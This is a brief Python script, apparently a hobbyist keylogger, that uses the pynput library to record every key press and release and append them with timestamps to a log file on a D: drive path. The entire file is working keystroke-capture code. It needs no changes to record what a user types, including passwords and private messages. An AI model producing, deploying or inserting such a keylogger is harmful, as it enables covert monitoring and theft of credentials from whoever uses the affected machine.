from pynput.keyboard import Listener
import  logging

#Mention Destination Address To Store the key values as a file
logging.basicConfig(filename=("D:\samosa\logg.txt"), level=logging.DEBUG ,format="%(asctime)s-------%(message)s",filemode='a+')

def on_press(key):
    print(key,"pressed")
    logging.info(str(key))


def on_release(key):
    print(key,"released")
    logging.info(str(key))
    
    
with Listener(on_press=on_press , on_release=on_release) as listener :
    listener.join()